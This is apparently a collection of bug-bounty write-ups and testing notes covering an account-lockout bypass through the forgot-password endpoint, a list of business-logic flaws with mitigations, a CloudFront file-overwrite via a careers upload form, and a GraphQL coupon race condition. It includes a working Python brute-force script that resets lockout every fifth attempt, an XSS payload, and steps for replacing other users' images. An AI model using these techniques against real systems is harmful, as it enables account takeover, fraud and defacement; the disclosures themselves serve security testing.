
**I found that after five unsuccessful login attempts, the account would become locked.**

However, I discovered that by sending a post request to the forgot password page with the email address associated with the locked account, ~={yellow}it was possible to unlock the account without any additional verification.=~


This vulnerability could allow an attacker to repeatedly **try different passwords in an automated fashion until the account is locked, and then use the forgot password feature to unlock the account** and continue the password guessing attack.


To demonstrate the impact of this vulnerability, I created a proof-of-concept script using the Python requests library.

The script reads a list of passwords from a text file, password.txt and repeatedly sends login requests to the target application, ~={blue}including the forgot password request after every 5th failed login attempt.=~ The code is provided below for reference:

```python
import requests  
import json  
  
# read the password from the password.txt file  
with open("password.txt", "r") as f:  
    passwords = f.read().splitlines()  
  
# set the login endpoint  
login_url = "https://test.com/api/v2/accounts/Login"  
  
# set the headers for the JSON POST request  
headers = {'Content-Type': 'application/json'}  
  
# set the login parameters  
login_params = {'username': 'test@test.com'}  
  
# send the login requests  
for i, password in enumerate(passwords):  
    login_params['password'] = password  
    response = requests.post(login_url, headers=headers, json=login_params)  
  
    if i % 5 == 4:  
        # send request to the forgot password endpoint  
        forgot_url = "https://test.com/api/accounts/forgotPassword"  
        forgot_params = {'email': 'test@test.com'}  
        requests.post(forgot_url, headers=headers, json=forgot_params)  
  
    if response.status_code == 200:  
        print("Login success! Password: " + password.strip())  
        break
```

![](https://miro.medium.com/v2/resize:fit:567/1*GXYtS6BGqQg51ZKvG-W2kw.png)

						Output

It is important to note that this vulnerability may be specific to the target application, and may not be present in other systems. However, this example serves as a reminder to thoroughly ~={orange}test account lockout and password reset functionality during security assessments.=~


---

# Business Logic Testing

1. Test For Business Logic
2. Test for Malicious File Uploads


**Common Types and Examples of Business Logic Vulnerabilities**

**1. Authentication Bypass**

**Example Scenario:** An application relies on client-side validation to verify user roles (e.g., admin status). By modifying the local storage or cookies, an attacker changes `isAdmin=true`, which the system then accepts without server-side verification.

**Mitigation:**

- Implement robust server-side authentication.
- Avoid relying on client-side data for critical decisions.
- Keep session states server-side to prevent unauthorized modifications.

**2. Price Manipulation**

**Example Scenario:** An attacker intercepts the following request:

```bash
POST /api/order HTTP/1.1
{
"productId": "123",
"quantity": 1,
"price": "10.00"
}
```

The attacker changes the `price` value before sending it to the server, causing the order to process at a reduced price.

**Mitigation:**

- Store and verify prices server-side.
- Reject any client-supplied price values.
- Use digital signatures to secure sensitive data.

**3. Discount/Coupon Abuse**

**Example Scenario:** A system permits stacking multiple discount codes without setting a maximum discount limit, allowing an attacker to combine discounts to receive items for free.

**Mitigation:**

- Set maximum discount limits.
- Validate and restrict coupon stacking.
- Track coupon usage by user or order.

**4. Parameter Tampering**

**Example Scenario:** An attacker alters URL parameters, such as:

```bash
GET /api/account/transfer?fromAccount=1234&toAccount=5678&amount=100
```

They change account numbers or amounts without ownership validation, allowing unauthorized fund transfers.

**Mitigation:**

- Validate all parameters server-side.
- Confirm account ownership and permissions.
- Use `POST` instead of `GET` for sensitive operations.

**5. Workflow Bypass**

**Example Scenario:** In a multi-step checkout process, an attacker accesses the final confirmation endpoint directly, skipping the payment step to complete the order without payment.

**Mitigation:**

- Enforce strict state management to track the completion of required steps.
- Use secure session tracking for workflow state.
- Validate each step to ensure sequential completion.

**6. Race Conditions**

**Example Scenario:** During a flash sale with limited items, the lack of an inventory lock allows multiple users to purchase the same item simultaneously, exceeding the available stock.

**Mitigation:**

- Implement locking mechanisms for inventory.
- Use database transactions to maintain stock integrity.
- Apply concurrency controls to prevent overselling.

**7. Input Validation Gaps**

**Example Scenario:** A form permits negative quantities, allowing attackers to process refunds for negative amounts, which could result in a credit rather than a charge.

**Mitigation:**

- Enforce strict input validation, especially for numeric fields.
- Apply business rules to ensure inputs align with expected values.
- Use appropriate data types and range checks.

**8. Insufficient Access Controls**

**Example Scenario:** An attacker modifies a user ID in a URL to access another user's document without permission:


```bash
GET /api/user/12345/document
```


----

While roaming around the application I saw an upload functionality on careers page where a user can upload cv in pdf or doc format.

![](https://miro.medium.com/v2/resize:fit:700/1*4FMbk8M39dbiHEddzfwY_A.png)

Careers page.

You already know the next step. I uploaded the file with .html extension containing a simple XSS payload (**_<script>alert(1)</script>_**) and It was uploaded. But things are not as easy as they appears. I located the URL where it was uploaded and as soon as I visited the URL, Instead of triggering my XSS payload it downloaded the html file I’ve uploaded. and one more thing I’ve noticed that, files uploaded through careers page are stored in cloudfront.


# Additional Knowledge:

> **_What is Amazon CloudFront:_**  
> Amazon CloudFront is a web service that speed up distribution of your static and dynamic web content, such as .html, .css, .js and image files to your users. CloudFront delivers your content through a worldwide network of data centers called edge locations. When a user requests content that you’re serving with CloudFront, the request is routed to the edge location that provides the lowest latency (time delay), so that content is delivered with the best possible performance.  

> **In short, It is a content distribution system that used to give high performance on sharing web contents.**

> **Read more about CloudFront:** [https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Introduction.html](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Introduction.html)


Getting back to the vulnerability, my payload was uploaded on [https://something.cloudfront.net/payload.html](https://something.cloudfront.net/payload.html). After several fail attempts to execute my XSS payload I left the upload functionality.

I logged in and visited any random user’s profile. This time I wanted **to find directory listing (Though it is a low hanging fruit. sometimes, you can find juicy information through directory listing).** To do that I right clicked on profile picture of that random user and copied the image location and opened that location in a new tab.

Copied image location was something like this: [https://something.cloudfront.net/randomnumber_IMG_randomnumber.jpeg](https://something.cloudfront.net/randomnumber_IMG_randomnumber.jpeg) As you can observe that profile pictures of users are also stored in the root folder of the same cloudfront storage.


> **_Here is the brief of my observations:_**
> 
> • Upload functionality at careers page should accept only pdf and doc file but it is accepting any type of file.  
> • Profile pictures of users and CVs uploaded through careers pages are stores in root folder of same cloudfront storage.  
> • File name of the file uploaded through careers page is not renamed before uploading it. and name of the file remains same.


# Game begins from here:

I downloaded a random picture from google and changed the name of that picture to “randomnumber_IMG_randomnumber.jpeg” (randomnumber_IMG_randomnumber.jpeg is the image name of profile picture of that random user mentioned above.) **and simply uploaded randomnumber_IMG_randomnumber.jpeg using the upload functionality available at careers page.**

![](https://miro.medium.com/v2/resize:fit:700/1*FR-oKjzqOhTnbltFK0vAgQ.png)

		Uploaded picture with the same name as profile picture name.

![](https://miro.medium.com/v2/resize:fit:700/1*-nSigsAi-jwCmDT4afe5FQ.png)

		Profile of random user before uploading picture.

Visited the profile of that random user but still profile picture not changed 😑, But then I realized the web page was cached in the browser😅. **I quickly opened the website in incognito mode and visited that random user’s profile.**

Guess what, Profile picture was changed with my uploaded picture.😁

![](https://miro.medium.com/v2/resize:fit:700/1*_DxkIkwmguWoDTTZ9_BHgQ.png)

Profile picture of random user changed after uploading picture.😎

# Wait…It’s not over yet.

The web application also has a functionality where users can shop.  
Picture of all products were also stored in the root folder of same cloudfront and by ~={yellow}repeating above steps I was also able to change the picture of any product available:=~

![](https://miro.medium.com/v2/resize:fit:700/1*e1iKHNyHTQHVBDaRzbicbw.png)

									Before.

![](https://miro.medium.com/v2/resize:fit:700/1*vSaoXn8_fDp_7dzKiN3VZQ.png)

		Uploading a picture with same name as product image name.

![](https://miro.medium.com/v2/resize:fit:700/1*zDQZLqKHGqkbgc1UfXaxUA.png)

							After.

# Revision Time:

> **_Steps to Reproduce:_**  
> 1. Visit any user’s profile and copy profile picture location.  
> 2. Paste it on any text editor and copy image name.  
> 3. Rename picture you want to change with target user’s profile picture to the copied image name.  
> 4. Go to [https://target.com/careers](https://target.com/carrers) and upload the picture.  
> 5. Refresh the target user’s profile or open target user’s profile in incognito mode and observe that profile picture of target user is change with picture of your choosing.
> 
> **_Root cause:_**  
> Application does not check for valid file type and it **does not check if file with same name is already in cloudfront storage and simply overwrite it.**

----

## How Race Condition Worth Me $1000 On YesWeHack

Let consider the program **_xxx._**

As part of the Android testing scope, they provided **two versions of the same application**: one was protected with **RASP (Runtime Application Self-Protection)**, and the other was unprotected.

For those unfamiliar, RASP is a security mechanism that detects and prevents malicious behavior at runtime. The protected app had everything locked down — SSL pinning, root detection, virtual device detection. So I thought Let’s start with the unprotected version.

# Initial Recon & Feature Discovery

I began with **static analysis** using `jadx-gui`, but nothing was interesting. Then I moved on to **dynamic testing** using Burp Suite.

While casually browsing the app’s features, I found a section called **“Reward”**. In this section, users could redeem coupons by clicking on a **“Redeem”** button, and a coupon would be added into the account. _These coupons could later be used to get discounts._

I tested the normal flow first just to understand how it worked. It seemed that once you redeemed a coupon, **you couldn’t redeem that same coupon again.**

_This looks like interesting man! I again go to Reward section clicked on Redeem but here i intercepted the request. And the **Graphql** request is looks like:_

```http
POST /graphql/ HTTP/2  
Host: api.xxx.com  
...  
...  
Headers  
...  
...  
Content-Type: application/json  
Content-Length: 695  
Accept-Encoding: gzip, deflate, br  
  
{"campaignId":"12794"}
```

Before starting the actual attack, i just send this request to the repeater and clicked on “**Send**” It shown a response like this:

```http
HTTP/2 200 OK  
Content-Type: application/json; charset=utf-8  
Vary: Origin  
...  
...  
Headers  
...  
...  
  
{  
	"data": {  
		"issueCoupon": {  
		"__typename": "Coupon",  
		"id": "6741129",  
		"couponCode": null  
		}  
	}  
}
```

Here, i can observe that  is giving the  **Coupon id** and **Coupon Code**, but since is a  testing application, the coupon **code was null**. then i tried to send the request again but i received the same coupon id. At that moment i understood the complete logic of this Graphql request.

The simple logic was — you can redeem the coupon once, but if you try to send the same request again of the redeem coupon, then you will only get the same generated coupon.

Here, i decided to test for **race condition**.

So  again go to the **Reward** section, select another coupon, intercept the request and send it to Turbo Intruder. Then,  selected the `examples/race-single-packet-attack.py` script to do race condition attack. 

after sending multiple **Graphql** request at the same time, i got different coupon ids in the response like, 6741129, 6741130, 6741131, 6741132, and so on…

![](https://miro.medium.com/v2/resize:fit:705/0*7NCMQNL42oHZPyzF.png)

					turbo_intruder_race_condition

here again the `couponCode` was **null** as this was a testing environment. And then i went to the coupon tab where redeemed coupons can be displayed, and i could see that the same coupon was generated multiple times.

This means i have successfully done the attack. 

But It Wasn’t Over Yet…, When I reported the issue to the company, their first reply was: “**This coupon on which you were able to do race condition was just for testing purpose and it has no limits to generate coupons, we will prepare another coupon which will have limit to generate 2 coupons only and we will give it to you for testing.**”

	This time, I ran the same attack.

![](https://miro.medium.com/v2/resize:fit:671/1*u1wQhaXLFdGD6UBqqqATtA.png)

					still_more_than_2_coupons

I didn’t get 10 or 20 coupons like before — but I **did get 3**, even though the limit was **2**. And this time, the `couponCode` field  contained real coupon values because they were original coupons and not for testing purpose only.

But again company was also demanding more. they first accepted the report as a **high severity** and then told me:

“**Perform the same attack on over RASP protected application, if you can do that then we will increase the reward.”**

Sadly i couldn't bypass the RASP protection and the company rewarded me with a 1k$.

![[Pasted image 20250420164857.png]]


_Contact Researcher:_

[https://www.linkedin.com/in/manan-sanghvi-799863176/](https://www.linkedin.com/in/manan-sanghvi-799863176/)

[https://www.instagram.com/_manan_sanghvi/](https://www.instagram.com/_manan_sanghvi/)

[https://twitter.com/_manan_sanghvi/](https://twitter.com/_manan_sanghvi/)

----



